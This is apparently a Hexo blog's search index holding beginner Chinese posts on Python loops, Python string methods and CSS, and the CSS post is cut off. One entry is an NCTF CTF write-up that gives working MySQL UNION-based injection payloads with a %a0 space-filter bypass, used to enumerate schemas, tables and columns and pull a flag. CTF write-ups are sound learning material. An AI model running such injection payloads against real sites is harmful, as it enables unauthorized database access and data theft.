<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Python打印各种图形</title>
      <link href="/2018/12/22/Python%E6%89%93%E5%8D%B0%E5%90%84%E7%A7%8D%E5%9B%BE%E5%BD%A2/"/>
      <url>/2018/12/22/Python%E6%89%93%E5%8D%B0%E5%90%84%E7%A7%8D%E5%9B%BE%E5%BD%A2/</url>
      <content type="html"><![CDATA[<p>很锻炼萌新思维的一些题 总结的时候发现循环这一块理解的并不是很到位</p><p><img src="/2018/12/22/Python打印各种图形/0.jpg" alt=""></p><a id="more"></a><h3 id="直角三角形"><a href="#直角三角形" class="headerlink" title="直角三角形"></a>直角三角形</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10):</span><br><span class="line">for j in range(i+1):</span><br><span class="line">print(&apos;*&apos;,end=&quot; &quot;)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/1.jpg" alt=""></p><h3 id="直角三角形旋转90°"><a href="#直角三角形旋转90°" class="headerlink" title="直角三角形旋转90°"></a>直角三角形旋转90°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10,0,-1):</span><br><span class="line">for j in range(i-1):</span><br><span class="line">print(&apos;*&apos;,end=&quot; &quot;)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/2.jpg" alt=""></p><h3 id="直角三角形旋转180°"><a href="#直角三角形旋转180°" class="headerlink" title="直角三角形旋转180°"></a>直角三角形旋转180°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for i in range(1,10):</span><br><span class="line">    for j in range(1,i):</span><br><span class="line">        print(&quot; &quot;,end=&quot; &quot;)</span><br><span class="line">    for k in range(10,i,-1):</span><br><span class="line">        print(&quot;*&quot;,end=&quot; &quot;)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/3.jpg" alt=""></p><h3 id="直角三角形旋转270°"><a href="#直角三角形旋转270°" class="headerlink" title="直角三角形旋转270°"></a>直角三角形旋转270°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">for i in range(1,10):</span><br><span class="line">    for j in range(9,i,-1):</span><br><span class="line">        print(&quot; &quot;,end=&quot; &quot;)</span><br><span class="line">    for k in range(1,i):</span><br><span class="line">        print(&quot;*&quot;,end=&quot; &quot;)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/4.jpg" alt=""></p><h3 id="等腰三角形"><a href="#等腰三角形" class="headerlink" title="等腰三角形"></a>等腰三角形</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10):</span><br><span class="line">    for j in range(0, 10 - i):</span><br><span class="line">        print(end=&quot; &quot;)</span><br><span class="line">    for k in range(10 - i, 10):</span><br><span class="line">        print(&quot;*&quot;, end=&quot; &quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/5.jpg" alt=""></p><h3 id="等腰三角形旋转90°"><a href="#等腰三角形旋转90°" class="headerlink" title="等腰三角形旋转90°"></a>等腰三角形旋转90°</h3><p>这里用的是用的直角三角形和选择转90°的直角三角形</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10):</span><br><span class="line">    for j in range(0, i):</span><br><span class="line">        print(&apos;*&apos;,end=&quot; &quot;)</span><br><span class="line">    print()</span><br><span class="line">for i in range(10):</span><br><span class="line">    for j in range(10, i,-1):</span><br><span class="line">        print(&apos;*&apos;,end=&quot; &quot;)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/6.jpg" alt=""></p><h3 id="等腰三角形旋转180°"><a href="#等腰三角形旋转180°" class="headerlink" title="等腰三角形旋转180°"></a>等腰三角形旋转180°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10):</span><br><span class="line">    for j in range(0,i):</span><br><span class="line">        print(end=&quot; &quot;)</span><br><span class="line">    for k in range(0, 10-i):</span><br><span class="line">        print(&quot;*&quot;, end=&quot; &quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/7.jpg" alt=""></p><h3 id="等腰三角形旋转270"><a href="#等腰三角形旋转270" class="headerlink" title="等腰三角形旋转270"></a>等腰三角形旋转270</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10):</span><br><span class="line">    for j in range(9,i,-1):</span><br><span class="line">        print(&quot; &quot;,end=&quot; &quot;)</span><br><span class="line">    for k in range(0, i):</span><br><span class="line">        print(&quot;*&quot;,end=&quot; &quot;)</span><br><span class="line">    </span><br><span class="line">    print()</span><br><span class="line">for i in range(10):</span><br><span class="line">    for j in range(0,i):</span><br><span class="line">        print(&quot; &quot;,end=&quot; &quot;)</span><br><span class="line">    for k in range(9, i,-1):</span><br><span class="line">        print(&quot;*&quot;,end=&quot; &quot;)</span><br><span class="line">    </span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/8.jpg" alt=""></p><h3 id="菱形"><a href="#菱形" class="headerlink" title="菱形"></a>菱形</h3><p>原等腰三角形和旋转180°的等腰三角形加在一起即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">for i in range(10):</span><br><span class="line">    for j in range(0, 10 - i):</span><br><span class="line">        print(end=&quot; &quot;)</span><br><span class="line">    for k in range(10 - i, 10):</span><br><span class="line">        print(&quot;*&quot;, end=&quot; &quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;&quot;)</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    for j in range(0,i):</span><br><span class="line">        print(end=&quot; &quot;)</span><br><span class="line">    for k in range(0, 10-i):</span><br><span class="line">        print(&quot;*&quot;, end=&quot; &quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/9.jpg" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过打印以上各种图形 感觉对for的理解更深刻了 明天会更好 真好</p>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python字符串方法总结</title>
      <link href="/2018/12/18/Python%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
      <url>/2018/12/18/Python%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p><img src="/2018/12/18/Python字符串方法总结/1.jpg" alt=""></p><p>又是一篇菜鸡笔记 在学校很多毫无意义的事情要忙没那么多时间 自己学习效率也有待提高 今天正好有时间 加上课上也讲到了这些东西 还是比较难记的 所以总结一下 没有多少时间了 加油呀</p><a id="more"></a><h3 id="str-strip"><a href="#str-strip" class="headerlink" title="str.strip()"></a>str.strip()</h3><p>清除字符串两端的空格 较常用</p><h3 id="str-capitalize"><a href="#str-capitalize" class="headerlink" title="str.capitalize()"></a>str.capitalize()</h3><p>将首字符转换成大写 如果首字符没有大写形式 就返回原字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;xhy&apos;.capitalize()</span><br><span class="line">&apos;Xhy&apos;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="str-title"><a href="#str-title" class="headerlink" title="str.title()"></a>str.title()</h3><p>将字符串中每个首字母 大写。判断每个单词的依据则是基于空格和标点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;scholar xhy&apos;.title()</span><br><span class="line">&apos;Scholar Xhy&apos;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="str-lower"><a href="#str-lower" class="headerlink" title="str.lower()"></a>str.lower()</h3><p>将字符串转换为小写  仅对ascii编码的字母有效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;XHY&apos;.lower()</span><br><span class="line">&apos;xhy&apos;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="str-upper"><a href="#str-upper" class="headerlink" title="str.upper()"></a>str.upper()</h3><p>将字符串转换为大写 会自动忽略不可转换成大写的字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;scholar10&apos;.upper()</span><br><span class="line">&apos;SCHOLAR10&apos;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="str-center"><a href="#str-center" class="headerlink" title="str.center()"></a>str.center()</h3><p>将字符串按照给定的宽度居中显示，可以给定特殊的字符 填充多余的长度 如果指定长度小于字符串长度 则返回原字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;12345&apos;.center(10,&quot;*&quot;)</span><br><span class="line">&apos;**12345***&apos;</span><br></pre></td></tr></table></figure><h3 id="str-count"><a href="#str-count" class="headerlink" title="str.count()"></a>str.count()</h3><p>统计指定字符串 在原字符串中的个数 </p><p>str.count()可以指定查询字符串的起止位置</p><p>如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; test=&apos;Scholars work very hard&apos;</span><br><span class="line">&gt;&gt;&gt; test.count(&apos;a&apos;)</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; test.count(&apos;a&apos;,5,8)</span><br><span class="line">1</span><br></pre></td></tr></table></figure><h4 id="检验邮箱格式是否正确"><a href="#检验邮箱格式是否正确" class="headerlink" title="检验邮箱格式是否正确"></a>检验邮箱格式是否正确</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">email=input(&quot;请输入email邮箱&quot;)</span><br><span class="line">if email.count(&quot;@&quot;)==1:</span><br><span class="line">    </span><br><span class="line">    if email.count(&quot;.&quot;)&gt;=1:</span><br><span class="line">        print(&quot;格式正确&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;邮箱应包含.&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;邮箱中应包含@&quot;)</span><br></pre></td></tr></table></figure><h3 id="str-find-str-rfind"><a href="#str-find-str-rfind" class="headerlink" title="str.find() str.rfind()"></a>str.find() str.rfind()</h3><p>从字符串左边或右边查找指定元素出现的索引位置 也可以指定 查找的起止范围 要查找的元素不存在时 返回-1</p><p><strong>(不论左边还是右边查找得到的结果都是字符串左边数起的)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; text = &apos;puter protective covering&apos;</span><br><span class="line">&gt;&gt;&gt; text.find(&apos;er&apos;)</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; text.find(&apos;sc&apos;)</span><br><span class="line">-1</span><br><span class="line">&gt;&gt;&gt; text.find(&apos;er&apos;,3)</span><br><span class="line">3</span><br></pre></td></tr></table></figure><h3 id="str-index-str-rindex"><a href="#str-index-str-rindex" class="headerlink" title="str.index() str.rindex()"></a>str.index() str.rindex()</h3><p>与 str.find() str.rfind()类似 不同的是如果要查找的元素不存在 则会引发ValueError</p><h3 id="str-replice"><a href="#str-replice" class="headerlink" title="str.replice()"></a>str.replice()</h3><p>str.replice(old,new,count)</p><p>用新字符串代替旧字符串 可以指定替换次数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; text = &apos;qwe asd kkk lll qwe&apos;</span><br><span class="line">&gt;&gt;&gt; text.replace(&apos;qwe&apos;,&apos;scholar&apos;)</span><br><span class="line">&apos;scholar asd kkk lll scholar&apos;</span><br><span class="line">&gt;&gt;&gt; text.replace(&apos;qwe&apos;,&apos;scholar&apos;,1)</span><br><span class="line">&apos;scholar asd kkk lll qwe&apos;</span><br></pre></td></tr></table></figure><h3 id="str-endswith-str-startswith"><a href="#str-endswith-str-startswith" class="headerlink" title="str.endswith() str.startswith()"></a>str.endswith() str.startswith()</h3><p>判断字符串是否以某个指定的字符串 开头或结尾 返回布尔值 可指定查找的起止范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a=&quot;Scholars work very hard&quot;</span><br><span class="line">&gt;&gt;&gt; a.endswith(&apos;rd&apos;)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; a.startswith(&quot;Sc&quot;)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h3 id="str-split"><a href="#str-split" class="headerlink" title="str.split()"></a>str.split()</h3><p>使用指定的字符将整个字符串拆分为若干个元素 并返回一个列表 ，默认没有参数时 拆分符为空格符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;1,2,3&apos;.split(&apos;,&apos;)</span><br><span class="line">[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;]</span><br><span class="line">&gt;&gt;&gt; &apos;i love python&apos;.split()</span><br><span class="line">[&apos;i&apos;, &apos;love&apos;, &apos;python&apos;]</span><br></pre></td></tr></table></figure><h3 id="str-isdigit"><a href="#str-isdigit" class="headerlink" title="str.isdigit()"></a>str.isdigit()</h3><p>isdigit() 方法检测字符串是否只由数字组成 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; str = &apos;123&apos;</span><br><span class="line">&gt;&gt;&gt; str.isdigit()</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; str = &apos;scholar&apos;</span><br><span class="line">&gt;&gt;&gt; str.isdigit()</span><br><span class="line">False</span><br></pre></td></tr></table></figure><h3 id="字符串方法的实际运用"><a href="#字符串方法的实际运用" class="headerlink" title="字符串方法的实际运用"></a>字符串方法的实际运用</h3><p>任意读入一个字符串 判断是否为数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">s=input(&quot;请任意输入一个数字字符串&quot;)##-1.23 1.23</span><br><span class="line">if s.startswith(&apos;-&apos;):</span><br><span class="line">    str1=s.split(&apos;-&apos;)##-1.23</span><br><span class="line">    str2=str1[1]</span><br><span class="line">elif s.startswith(&apos;+&apos;):</span><br><span class="line">    str1=s.split(&apos;+&apos;)</span><br><span class="line">    str2=str1[1]</span><br><span class="line">else:</span><br><span class="line">    str2=s</span><br><span class="line"></span><br><span class="line">dotCounts=str2.count(&apos;.&apos;)</span><br><span class="line">if dotCounts==0 and str2.isdigit()==True:</span><br><span class="line">    print(&quot;%s是一个数字&quot;%(s))</span><br><span class="line">elif dotCounts==1:</span><br><span class="line">    strList=str2.split(&apos;.&apos;)</span><br><span class="line">    if strList[0].isdigit() and strList[1].isdigit():</span><br><span class="line">        print(&quot;%s是一个数字&quot;%(s))</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;%s不是一个数字&quot;%(s))</span><br><span class="line">else:</span><br><span class="line">    print(&quot;%s不是一个数字&quot;%(s))</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>记被大佬们带飞的一次NCTF</title>
      <link href="/2018/11/26/%E8%AE%B0%E8%A2%AB%E5%A4%A7%E4%BD%AC%E4%BB%AC%E5%B8%A6%E9%A3%9E%E7%9A%84%E4%B8%80%E6%AC%A1NCTF/"/>
      <url>/2018/11/26/%E8%AE%B0%E8%A2%AB%E5%A4%A7%E4%BD%AC%E4%BB%AC%E5%B8%A6%E9%A3%9E%E7%9A%84%E4%B8%80%E6%AC%A1NCTF/</url>
      <content type="html"><![CDATA[<p>前些天 国光老哥在群里问有没有打NJUPT CTF的 校外和他组队 然后问了问光光老哥说是 面向校外 不能太简单 但是对新手也不会太不友好 然后就本着去学东西 练习的态度 抱老哥的大腿去（嘻嘻）最后果然 校外队第九 咳咳 虽然我只是观众 大佬们都很强哟  但是也不希望自己一直都是观众 所以 特此总结一些题 希望以后越来越🐮🍺</p><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/0.jpg" alt=""></p><a id="more"></a><h1 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h1><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/1.png" alt=""></p><p>满怀自信的右键源代码 然后发现并没有flag 最后大佬们发现直接访问主域名 老把精力放在了secret.php 这上面</p><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/2.jpg" alt=""></p><h1 id="滴！晨跑打卡"><a href="#滴！晨跑打卡" class="headerlink" title="滴！晨跑打卡"></a>滴！晨跑打卡</h1><p>这道题 是自己复习的重点了 </p><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/3.jpg" alt=""></p><p>点进去 知道考察的是 mysql 注入 但是 当时自己就是搞不出来 还差的远 事后又请教了国光老哥 </p><h2 id="验证注入是否存在"><a href="#验证注入是否存在" class="headerlink" title="验证注入是否存在"></a>验证注入是否存在</h2><p>验证时候发现过滤了空格 用%a0即可绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;%a0||&apos;1</span><br></pre></td></tr></table></figure><p> 这里直接查询出所有的数据了</p><p>如果没有这个语句的话 默认只查询出1条数据 </p><p>‘ or ‘1 相当于构造出一个用真的条件 </p><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/4.jpg" alt=""></p><h2 id="开始进行注入"><a href="#开始进行注入" class="headerlink" title="开始进行注入"></a>开始进行注入</h2><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/5.jpg" alt=""></p><p>​    咳咳 大佬语录记录一下 ！借助hackbar可以进行快速的注入</p><h3 id="判断注入的字段数"><a href="#判断注入的字段数" class="headerlink" title="判断注入的字段数"></a>判断注入的字段数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;%a0union%a0select%a01,2,3||&apos;1  </span><br><span class="line">&apos;             union select 1,2,3       ||&apos;1</span><br><span class="line">闭合前面的引号  核心语句 查报错的字段数      构造用真条件 闭合后面语句</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/6.jpg" alt=""></p><h3 id="所有数据库"><a href="#所有数据库" class="headerlink" title="所有数据库"></a>所有数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0UNION%a0SELECT%a0(SELECT%a0GROUP_CONCAT(schema_name%a0SEPARATOR%a00x3c62723e)%a0FROM%a0INFORMATION_SCHEMA.SCHEMATA),2,3||%271</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/7.jpg" alt=""></p><p>咳咳根据我多年打酱油的经验 </p><h3 id="查询flaaaaaaag数据库下面的表"><a href="#查询flaaaaaaag数据库下面的表" class="headerlink" title="查询flaaaaaaag数据库下面的表"></a>查询flaaaaaaag数据库下面的表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0UNION%a0SELECT%a0(SELECT%a0GROUP_CONCAT(table_name%a0SEPARATOR%a00x3c62723e)%a0FROM%a0INFORMATION_SCHEMA.TABLES%a0WHERE%a0TABLE_SCHEMA=0x666c6161616161616167),2,3||%271</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/8.jpg" alt=""></p><p>f144444444g</p><h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0UNION%a0SELECT%a0(SELECT%a0GROUP_CONCAT(column_name%a0SEPARATOR%a00x3c62723e)%a0FROM%a0INFORMATION_SCHEMA.COLUMNS%a0WHERE%a0TABLE_NAME=0x6631343434343434343467),2,3||%271</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/9.png" alt=""></p><h3 id="查出数据"><a href="#查出数据" class="headerlink" title="查出数据"></a>查出数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ctfgame.acdxvfsvd.net:20001/index.php?id=1%27%a0UNION%a0SELECT%a0(SELECT%a0GROUP_CONCAT(column_name%a0SEPARATOR%a00x3c62723e)%a0FROM%a0INFORMATION_SCHEMA.COLUMNS%a0WHERE%a0TABLE_NAME=0x6631343434343434343467),2,3||%271</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/记被大佬们带飞的一次NCTF/10.png" alt=""></p><p>nctf{this_1s_paocao_sqllllll} </p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>css样式那些事</title>
      <link href="/2018/11/05/css%E6%A0%B7%E5%BC%8F%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
      <url>/2018/11/05/css%E6%A0%B7%E5%BC%8F%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
      <content type="html"><![CDATA[<p>最近学校开了前端 希望通过自己的努力打开web前端的大门</p><p>最令人头疼的就是css的各种属性 真心事记住不 所以 写篇文章总结一下 </p><p><img src="/2018/11/05/css样式那些事/0.jpg" alt=""></p><a id="more"></a><h1 id="文字样式"><a href="#文字样式" class="headerlink" title="文字样式"></a>文字样式</h1><h2 id="常用单位"><a href="#常用单位" class="headerlink" title="常用单位"></a>常用单位</h2><p>首先看一下css样式的常用单位 </p><p>以 px像素为单位的 </p><p>em 对于文本类型的属性经常使用到</p><p>1em指一个字符 2em指两个字符(比如我们设置行高 两个字符的行高 就把这个属性的值设置成2em)</p><p>还有一个%为单位 这个不用多说了把</p><h2 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">color 文本的颜色 (red  #f00  rgd(255,0,0)  ) </span><br><span class="line">letter-spacing 字符间距 (2px -3px)</span><br></pre></td></tr></table></figure><p><img src="/2018/11/05/css样式那些事/1.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">line-height      行高   (14px 1.5em 120%)</span><br></pre></td></tr></table></figure><p><img src="/2018/11/05/css样式那些事/2.jpg" alt=""></p><p>很多时候我们用这个来做垂直居中 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">line-height =height   的时候 就会做到垂直居中</span><br></pre></td></tr></table></figure><p><img src="/2018/11/05/css样式那些事/3.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text-align  对齐(center居中 left左 right右 justify两端对齐不会让两端出现空白的部分）</span><br></pre></td></tr></table></figure><p><img src="/2018/11/05/css样式那些事/4.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text-decoration 装饰线</span><br></pre></td></tr></table></figure><p> (none无装饰线 默认情况下超链接下面都带有竖线 貌似很影响美观把 这时候none可将其取消，overline装饰线在文本的上方 underline装饰线在文本的下方  line-through 装饰线作为删除线贯穿文本之中)</p><p><img src="/2018/11/05/css样式那些事/5.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text-indent首行缩进   (2em)</span><br></pre></td></tr></table></figure><h2 id="字体font"><a href="#字体font" class="headerlink" title="字体font"></a>字体font</h2><p><img src="/2018/11/05/css样式那些事/6.jpg" alt=""></p><p>老规矩还是一张图 节省时间学习新知识去 O(∩_∩)O</p><h1 id="背景超链接样式"><a href="#背景超链接样式" class="headerlink" title="背景超链接样式"></a>背景超链接样式</h1><h2 id="背景类型的样式"><a href="#背景类型的样式" class="headerlink" title="背景类型的样式"></a>背景类型的样式</h2><p>我们用background</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">background-color: 背景颜色</span><br><span class="line"></span><br><span class="line">background-image:url(&quot;logo,jpg&quot;) 背景图片</span><br></pre></td></tr></table></figure><p>注意如果同时设置背景颜色和背景图片的话 背景图片会覆盖掉背景颜色</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">background-repeat: repeat背景图片的填充方式</span><br><span class="line"></span><br><span class="line">    repeat-x </span><br><span class="line"></span><br><span class="line">    repeat-y</span><br><span class="line"></span><br><span class="line">    no-repeat</span><br></pre></td></tr></table></figure><p>​     </p><p>可能显得太麻烦 太多 太难记 其实也可以用 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background: 颜色 图片 repeat 来统一设置</span><br></pre></td></tr></table></figure><h2 id="连接的四种形态"><a href="#连接的四种形态" 